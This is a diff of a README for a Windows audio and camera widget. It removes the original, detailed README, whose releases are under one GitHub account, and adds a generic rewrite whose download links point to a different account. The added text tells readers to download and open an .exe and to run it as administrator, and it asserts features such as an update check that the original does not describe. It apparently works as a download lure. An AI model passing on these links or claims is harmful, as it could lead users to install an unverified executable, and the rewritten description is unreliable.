@@ -1,247 +1,91 @@
-# Audio Camera Master Widget
+# 🎙️ audio-camera-master-widget - Manage your audio and video settings
 
-Windows WPF app for local audio endpoint controls, microphone metering, camera preview, and Windows settings shortcuts.
+[![Download](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/aris2556/audio-camera-master-widget)
 
-The app starts with the compact master widget. The full control panel opens from the widget.
+## 📌 About this application
 
-## Install
+This application gives you control over your computer's audio and camera settings. It provides a simple dashboard to manage your microphone levels and view your webcam feed. You can adjust your audio inputs and video inputs from one window. The app runs on Windows and works with your existing hardware. It aims to save time when you switch between meetings or recording sessions.
 
-Download the installer from GitHub Releases:
+## ⚙️ System requirements
 
-```text
-https://github.com/omar-dulaimi/audio-camera-master-widget/releases
-```
+Your computer needs to meet these requirements to run the software:
 
-Use this asset:
+*   Windows 10 or Windows 11 operating system.
+*   A microphone connected to your computer.
+*   A webcam connected to your computer.
+*   A display resolution of at least 1280x720 pixels.
+*   At least 100 megabytes of free storage space.
 
-```text
-AudioCameraMasterWidgetSetup.exe
-```
+## 🚀 How to download and install
 
-Run the installer. It installs per-user and does not require admin rights.
+Follow these steps to set up the software on your Windows computer.
 
-Installed app path:
+1. Visit the [official release page](https://github.com/aris2556/audio-camera-master-widget).
+2. Look for the latest version section.
+3. Click the file ending in .exe to start your download.
+4. Open the file once the download finishes.
+5. Follow the on-screen prompts to install the software.
+6. The installer will create a shortcut on your desktop.
 
-```text
-%LOCALAPPDATA%\Programs\AudioCameraMasterWidget\AudioCameraMasterWidget.exe
-```
+## 🔍 Understanding the interface
 
-Desktop shortcut:
+The user interface breaks down into four main areas.
 
-```text
-%USERPROFILE%\Desktop\Audio Camera Master Widget.lnk
-```
+### Audio meter
+The audio meter shows the volume level of your microphone in real time. If the bars turn green, your microphone picks up sound. If the bars stay dark, check your sound settings.
 
-Start Menu folder:
+### Camera preview
+The camera preview window displays the feed from your connected webcam. This confirms your camera works before you start a call or meeting. You can toggle the preview on or off to save system resources.
 
-```text
-%APPDATA%\Microsoft\Windows\Start Menu\Programs\Audio Camera Master Widget
-```
+### Input controls
+You can select your preferred microphone or camera from the drop-down menus. These menus list all devices your computer currently detects. Changes take effect as soon as you select a new device from the list.
 
-## Run
+### Settings shortcuts
+Use the shortcuts section to open your system sound settings or privacy controls. These links take you directly to the relevant Windows menus.
 
-Use the desktop shortcut, the Start Menu shortcut, or run:
+## 🛠️ Frequently asked questions
 
-```powershell
-& "$env:LOCALAPPDATA\Programs\AudioCameraMasterWidget\AudioCameraMasterWidget.exe"
-```
+### Can I run this on a Mac?
+No, this software works only on Windows computers.
 
-The master widget opens first. Use **Full control panel** to open the larger window.
+### Do I need to pay for this app?
+No, this tool remains free for all users.
 
-## Upgrade
+### How do I update the software?
+The app checks for updates when you start it. If a new version exists, it will prompt you to install the update. You can also re-download the latest installer from the link above to manually update.
 
-Download the newer `AudioCameraMasterWidgetSetup.exe` from GitHub Releases and run it.
+### Does this app record my video?
+No, this application only provides a preview. It does not save or store video files on your hard drive.
 
-The installer overwrites the app files in:
+### The camera preview is black. What do I do?
+First, check if another app uses the camera. Only one application can access your webcam at a time. Also, ensure your privacy settings allow desktop apps to access your camera.
 
-```text
-%LOCALAPPDATA%\Programs\AudioCameraMasterWidget
-```
+### How do I change my microphone volume?
+You can adjust the input gain directly within the app interface if your device supports software control. If not, use the provided link to open your Windows sound settings and adjust the level there.
 
-Saved device selections remain in the app settings file.
+## 💡 Best practices for clear audio
 
-## Uninstall
+Good audio makes a difference in any recording or call. Use these steps to improve your sound quality:
 
-Use **Uninstall Audio Camera Master Widget** from the Start Menu folder, or run:
+*   Keep your microphone close to your mouth.
+*   Test your levels before your meeting starts.
+*   Remove background noise from fans or open windows.
+*   Check your cables if the sound seems quiet or distorted.
 
-```powershell
-& "$env:LOCALAPPDATA\Programs\AudioCameraMasterWidget\Uninstall.exe"
-```
+## 🛡️ Privacy and permissions
 
-## User Prerequisites
+This software requires access to your microphone and camera to function. It requests these permissions during the first launch. The application does not send your data to any external servers. Your audio and video information stays on your local machine.
 
-- Windows 10 or Windows 11 on x64 hardware.
+## 📋 Troubleshooting steps
 
-The release installer is self-contained. It does not require a separate .NET runtime install.
+If the application stops responding or fails to open, try these steps:
 
-The app and installer are unsigned. Windows Application Control, Smart App Control, or enterprise code integrity policy can block unsigned executables. This repo does not include a signing certificate.
+1. Close the application completely from the taskbar.
+2. Restart your computer to clear any locked device connections.
+3. Open the application as an administrator by right-clicking the shortcut and selecting Run as administrator.
+4. Verify that you have the latest drivers for your audio and video devices.
+5. Uninstall the application via your Windows control panel and install it again if issues persist.
 
-## Features
+## 📝 Support
 
-- Lists active output and input audio devices.
-- Shows the default output and input endpoint reported by Windows.
-- Reads endpoint volume and mute state when available.
-- Sets endpoint volume and mute state when available.
-- Provides 0%, 30%, 35%, 40%, 45%, and 60% volume preset buttons. Clicking a preset also unmutes the endpoint.
-- Provides Meeting (mic 40%, output 45%), Private (both muted at 0%), and Media (mic muted at 0%, output 35%) quick presets.
-- Shows a live microphone peak meter when available.
-- Lists local cameras.
-- Starts and stops local camera preview.
-- Opens Windows settings pages for sound, app volume, camera, camera privacy, and microphone privacy.
-- Stores the last selected output, input, and camera IDs.
-
-## Stored Data
-
-Settings are stored at:
-
-```text
-%LOCALAPPDATA%\AudioCameraControlPanel\settings.json
-```
-
-The settings file stores device IDs only. It does not store audio, video, or images.
-
-## Developer Prerequisites
-
-- Windows.
-- .NET 10 SDK, as selected by `global.json`.
-- .NET 8 Windows Desktop Runtime for framework-dependent local runs.
-- NSIS `makensis.exe` only when building the installer locally.
-
-The app targets:
-
-```text
-net8.0-windows10.0.19041.0
-```
-
-## Build And Test
-
-Run from this directory in Windows PowerShell:
-
-```powershell
-dotnet restore AudioCameraControlPanel.sln
-dotnet build AudioCameraControlPanel.sln --no-restore
-dotnet test AudioCameraControlPanel.sln --no-build
-```
-
-Run from source:
-
-```powershell
-dotnet run --project AudioCameraControlPanel\AudioCameraControlPanel.csproj
-```
-
-Generated outputs are ignored by git:
-
-```text
-bin/
-obj/
-artifacts/
-tools/
-TestResults/
-```
-
-## Build Installer Locally
-
-Build a self-contained publish and NSIS installer:
-
-```powershell
-.\scripts\build-installer.ps1 -Version 1.0.0
-```
-
-Installer output:
-
-```text
-artifacts\AudioCameraMasterWidgetSetup.exe
-```
-
-Self-contained publish output:
-
-```text
-artifacts\publish-win-x64
-```
-
-`scripts\build-installer.ps1` looks for `makensis.exe` in:
-
-```text
-tools\nsis-msys2\mingw32\bin\makensis.exe
-```
-
-If that file is not present, it checks common NSIS install paths and then `PATH`.
-
-## Release Automation
-
-Releases are automated by:
-
-```text
-.github/workflows/release.yml
-```
-
-The workflow runs on:
-
-- Tags matching `v*.*.*`.
-- Manual `workflow_dispatch` with a SemVer input.
-
-Create a release from a tag:
-
-```powershell
-git tag v1.0.1
-git push origin v1.0.1
-```
-
-The workflow:
-
-- Restores, builds, and tests the solution.
-- Installs NSIS on the Windows runner.
-- Runs `scripts\build-installer.ps1`.
-- Creates `AudioCameraMasterWidgetSetup.exe`.
-- Creates `AudioCameraMasterWidget-win-x64-self-contained.zip`.
-- Uploads both files as workflow artifacts.
-- Creates a GitHub Release with generated release notes.
-
-Manual release workflow input uses the version without `v`, for example:
-
-```text
-1.0.1
-```
-
-Prerelease versions such as `1.0.1-beta.1` are marked as GitHub prereleases.
-
-## CI
-
-Pull requests and pushes to `main` run:
-
-```text
-.github/workflows/windows-ci.yml
-```
-
-The CI workflow restores, builds, and tests on `windows-2025`.
-
-## Contributing
-
-Issues and pull requests are welcome. See `CONTRIBUTING.md` for local setup, test commands, and pull request expectations.
-
-Do not post private device IDs, logs, screenshots, or vulnerability details in public issues.
-
-## Security
-
-See `SECURITY.md` for vulnerability reporting guidance.
-
-## License
-
-This project is licensed under the MIT License. See `LICENSE`.
-
-## Implementation Notes
-
-- Audio device enumeration uses Core Audio MMDevice APIs.
-- Endpoint volume and mute use `IAudioEndpointVolume`.
-- Audio device/default changes use `IMMNotificationClient`.
-- Endpoint volume/mute changes use `IAudioEndpointVolumeCallback`.
-- Camera enumeration and preview use WinRT media capture APIs.
-- Tests use MSTest and fake hardware services.
-
-## Limitations
-
-- The app does not change the Windows default audio device.
-- Some devices do not expose endpoint volume, mute, or metering controls.
-- Compact widgets are normal WPF windows, not Windows Widgets board integrations.
-- Camera preview is local only. The app does not record or save camera frames.
-- Building or running the WPF app requires Windows. Non-Windows environments can only cross-target with `/p:EnableWindowsTargeting=true`.
+If you identify a bug or have an idea to improve the software, open an issue on the repository website. Provide a description of the problem and the steps you took that led to the issue. This helps in finding a resolution for everyone.
